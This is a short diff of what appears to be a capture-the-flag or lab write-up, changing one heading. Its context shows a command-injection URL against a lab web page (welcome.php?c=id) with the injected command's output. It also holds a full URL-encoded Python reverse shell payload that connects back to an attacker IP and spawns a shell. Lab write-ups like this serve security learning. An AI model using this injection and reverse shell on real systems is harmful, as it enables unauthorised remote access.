@@ -190,7 +190,7 @@ http://10.10.122.127/welcome.php?c=id
 Thu May 22 09:06:33 2025 [pid 1973] ['uid=33(www-data) gid=33(www-data) groups=33(www-data) '] FAIL LOGIN: Client "::ffff:10.8.28.108"
 
 
-## reverse shell
+## Get reverse shell
 
 http://10.10.122.127/welcome.php?c=export%20RHOST=%2210.8.28.108%22;export%20RPORT=4444;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
 
